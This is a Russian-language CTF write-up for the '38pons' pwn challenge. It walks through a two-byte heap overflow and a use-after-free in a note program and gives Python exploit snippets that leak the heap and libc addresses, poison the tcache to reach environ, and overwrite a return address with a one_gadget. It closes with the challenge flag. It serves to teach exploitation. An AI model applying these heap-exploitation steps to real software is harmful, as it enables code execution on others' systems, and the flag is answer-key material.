# 38pons solve

Момент реверса пропускается, тк оставлены все символы в скомпилированном файле.

### Возможности

1. Создание записки

```c
void writeData() {
    if (blockCount + 1 > BLOCK_SIZE) {
        printf("%s\n\n", "You already PONED all your PON blocks");
        return;
    }
    blocks[blockCount] = malloc(BLOCK_SIZE);
    blockCount++;
    unsigned int toRead;
    printf("%s", "How much PONs: ");
    scanf("%d%*c", &toRead);
    if (toRead > BLOCK_SIZE + 2) {
        printf("%s\n", "So PON");
        exit(0);
    }
    printf("%s", "PON it: ");
    read(0, blocks[blockCount - 1], toRead);
    printf("%s\n\n", "PONed.");
}
```

Здесь сразу же видно уязвимость, выделяется 0x38 байт, а записать можно 0x3a (0x38 + 2).

Размер чанка на куче вычисляется следующим образом (для размеров больше 0x20):

`malloc(init_size)` - здесь указан размер, от которого мы будем считать

full_size = (init_size + 0x8) - округляется до 4 битов (33 -> 48, 32 -> 32, 67 -> 80)

Структура чанков в libc:

```
  адрес, возвращаемый при malloc
              ↓
--|-----------|------------|------------------|-----------------|--
  | full size | chunk data | empty data (0-8) | next chunk size |
--|-----------|------------|------------------|-----------------|--
              |                                                 |
              ---------------------------------------------------
                                      ↓
                                  full size
```

* full size (8 байт) - полный размер чанка (по сути от начала chunk_data до начала next_chunk_data)
* chunk data - данные чанка, которые, как предполагается, кладёт пользователь
* empty data (0-8 байт) - это то, что осталось от округления - размер next chunk size (по сути -8)
* next chunk size (8 байт) - размер следующего чанка

Из-за того, что размер выделяемых чанков 0x38 (0x38 + 8 == 0x40 округляется до 0x40), empty data отсутствует, а значит мы можем переписать первые два байта размера следующего чанка.

```
  адрес, возвращаемый при malloc
              ↓
--|-----------|------------|-----------------|--
  | full size | chunk data | next chunk size |
--|-----------|------------|--┬--------------|--
              |            |  |
              |-------------  |
              |     ↓         |
              |   0x38        |
              |               |
              -----------------
                      ↓         
              0x3a - наша запись
```

2. Чтение данных по номеру записки (от 0)

```c
void readData() {
    unsigned int readBlock;
    printf("%s", "What PON block data you want to see: ");
    scanf("%d%*c", &readBlock);
    if (readBlock >= BLOCK_SIZE || blocks[readBlock] == 0) {
        printf("%s\n\n", "No PON on this block");
        return;
    }
    printf("%s", "Your PON data: ");
    write(1, blocks[readBlock], BLOCK_SIZE);
    printf("\n\n");
}
```

3. Удаление записки

```c
void deleteData() {
    unsigned int readBlock;
    printf("%s", "What PON block data you want to delete: ");
    scanf("%d%*c", &readBlock);
    if (readBlock >= BLOCK_SIZE || blocks[readBlock] == 0) {
        printf("%s\n\n", "No PON on this block");
        return;
    }
    free(blocks[readBlock]);
    printf("%s\n\n", "PONed.");
}
```

Вторая уязвимость: при очищении записки мы никак не удаляем её из глобального массива, а значит по номеру удалённой записки в массиве до сих пор будет находится адрес записки, но уже очищенной. Что позволяет читать данные из очищенной памяти, а также изменять их (возможность 4)

4. Изменение записки

```c
void changeData() {
    unsigned int changeBlock;
    unsigned int toRead;
    printf("%s", "What PON block data you want to change: ");
    scanf("%d%*c", &changeBlock);
    if (changeBlock >= BLOCK_SIZE || blocks[changeBlock] == 0) {
        printf("%s\n\n", "No PON on this block");
        return;
    }
    printf("%s", "How much PONs: ");
    scanf("%d%*c", &toRead);
    if (toRead > BLOCK_SIZE) {
        printf("%s\n", "So PON");
        exit(0);
    }
    printf("%s", "PON it: ");
    read(0, blocks[changeBlock], toRead);
    printf("%s\n\n", "PONed.");
}
```

## Heap leak

После free чанк размером 0x38 попадает в структуру tcache_bins[0x40] (по полному размеру чанка, в tcache есть разделы для всех чанков размером от 0x20 до 0x410, не забываем про округление до 0x10). Работает данный также, как и структура stack в программировании. Последний вошёл - первый вышел.

Это значит что если мы сделаем манипуляцию

```c
void* ptr1 = malloc(0x38);
free(ptr1);
void* ptr2 = malloc(0x38);
// ptr1 == ptr2
```

### Структура очищенного чанка tcache

```
  адрес, возвращаемый при malloc
              ↓
--|-----------|----|----------|------------|--
  | full size | fp | heap key | chunk data |
--|-----------|----|----------|------------|--
```

* fp (8 байт) - замангленный адрес следующего очищенного чанка, находящегося в tcache_bins.
* heap key (8 байт) - ключ кучи
* chunk data (всё что было -16) - то что осталось не переписанным fp и heap key-ем

При следующей последовательности действий:

- Создаём чанк
- Очищаем его
- Читаем данные, находящиеся в чанке

Мы можем получить замангленный адрес 0 (тк в tcache ещё нет чанков) и ключ кучи.

Алгоритм mangle:

```python
def mangle(addr, value):
    return (addr >> 12) ^ value
```

В случае конкретно первого чанка то что лежит в fp будет являтся `magle(heap_base, 0)`, и если сделать обратную операцию (fp << 12) - можно получить адрес кучи.

```python
allocate() # 0 <- heap leak
free(0)
heap_bytes_leak = read(0)
heap_base = u64(heap_bytes_leak[:8]) << 12 # получение fp << 12
heap_key = u64(heap_bytes_leak[8:16]) # получение heap key
logger.info("Heap base: 0x%x", heap_base)
logger.info("Heap key: 0x%x", heap_key)
```

Теперь у нас есть базовый адрес кучи, благодаря которому мы теперь и сами можем манглить нужные нам адреса.

## Libc leak

в tcache попадают чанки до размера 1032 (0x410), чанки же большей длины попадают в структуру unsorted_bin.

### Структура очищенного чанка unsorted

```
  адрес, возвращаемый при malloc
              ↓
--|-----------|------------|------------|------------|--
  | full size | prev chunk | next chunk | chunk data |
--|-----------|------------|------------|------------|--
```

Структура чанков внутри unsorted - circular single linked list.

* prev chunk (8 байт) - предыдущий чанк, попавший в unsorted (если его нет, там лежит адрес на main_arena - АДРЕС ВНУТРИ LIBC)
* next chunk (8 байт) - следующий чанк, попавший в unsorted (если его нет, там лежит адрес на main_arena - АДРЕС ВНУТРИ LIBC)

Теперь вопрос, как сделать так, чтоб очищаемый чанк попал в unsorted.
Нам нужен размер > 0x410, а мы можем создавать только чанки размером 0x38.

Для этого и используется первая уязвимость, позволяющая переписать 2 байта размера чанка, лежащего следом за выделяемым.

Но есть одно маленькое НО. Нам нужно, чтоб в после нашего фейкового чанка лежали настоящие, иначе ничего работать не будет (кому интересно, можно сурсы либсы почитать, ошибка 1 - конец чанка дальше чем начало top чанка, ошибка 2 - в конце чанка нет валидного чанка, ошибка 3 - в конце следующего валидного чанка нет валидного чанка).

Чтоб всей этой мороки не было, создаём много много чанков и выставляем размер так, чтоб конец попадал на начало нашего валидного 0x40 чанка, за котором есть ещё один.

Проблема 2 - нам нужно переписать размер следующего лежащего чанка, для этого нам нужнно выделиться перед каким либо из наших чанков.

Решение:

- Выделяем 2 чанка

```
chunk 1 | chunk 2
```

- Очищаем первый

```
chunk 1 (free) | chunk 2
```

- Выделяем третий, тк чанк был в tcache, он выделится в том же месте, что и первый

```
переписываем длину второго чанка
                ↓
            chunk 3 | chunk 2
```

Дальше создаём (я делал 17) дополнительные чанки и очищаем наш чанк, размер которого мы изменили (можно в gdb потыкаться, чтоб красивенько размер выбрать, у меня 0x440 + 1 PREV_IN_USE)

```python
allocate() # 1 <- to free and rewrite
allocate() # 2 <- libc leak - чанк, у которого мы размер переписываем
for _ in range(17): # 3 - 19
    allocate()

free(1)
allocate(0x38 * b"A" + p16(0x441)) # 20 - изменяем размер на 0x440 + 1 PREV_IN_USE
free(2)
libc_bytes_leak = read(2)
libc_base = u64(libc_bytes_leak[:8]) - LIBC_BASE_TO_ARENA_OFFSET
logger.info("Libc leak 0x%x", libc_base)
```

## TCache Poisoning

Тк tcache берёт адрес следующего очищенного чанка из fp предыдущего, этот адрес можно переписать (предварительно заманглив, конечно).

Зная адрес libc, по оффсету можно узнать адрес глобальной переменной environ, по адресу которой находится адрес стека.

А значит, если мы отчисти 2 чанка, перепишем fp у последнего очищенного, следующий чанк выделится там, где мы захотим, а мы хотим, чтоб он выделился перед адресом environ, при этом, не переписав его (после выделения fp и heap key зануляются, то есть, зануляются первые 16 байт выделенного чанка, так что мы не можем выделится ровно по адресу environ, а должны чуть раньше, 16 байт занулятся, но read прочитает все 0x38 - получаем адрес стека)

```python
free(3)
free(4)
change(4, p64(mangle(heap_base, libc_base + LIBC_BASE_TO_ENVIRON_OFFSET - 24))) # &environ - 24

allocate() # 21 == 4 - выделяется чанк, с адресом, равным 4-ему чанку
allocate() # 22

environ_bytes_leak = read(22)
environ = u64(environ_bytes_leak[24:32])
logger.info("Environ 0x%x", environ)
```

После того, как мы узнали адрес стека, проворачиваем аналогичное на нём, при этом изменяя адрес возврата на libc one_gadeget

```python
free(5)
free(6)

change(6, p64(mangle(heap_base, environ - 0x158))) # смещение адреса возврата относительно environ
allocate() # 23 == 6
allocate(b"A" * 8 + p64(0) + p64(0) + p64(libc_base + 0x4f403)) # 24 - libc_one_gadget
```

Финальный штрих:

```
$ cat flag.txt
VKCTF{38_l1bc_h3@p5_824bbbfd2549a9506e6a011b089865b4}
```